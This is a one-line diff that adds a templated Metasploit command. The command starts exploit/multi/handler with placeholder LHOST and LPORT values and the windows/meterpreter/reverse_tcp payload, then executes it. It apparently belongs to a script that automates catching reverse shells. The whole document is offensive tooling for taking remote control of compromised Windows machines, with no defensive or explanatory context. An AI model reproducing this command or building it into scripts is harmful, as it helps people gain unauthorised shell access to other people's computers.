@@ -1,0 +1,1 @@
+%1 %2 exploit/multi/handler LHOST=%3 LPORT=%4 PAYLOAD=windows/meterpreter/reverse_tcp E
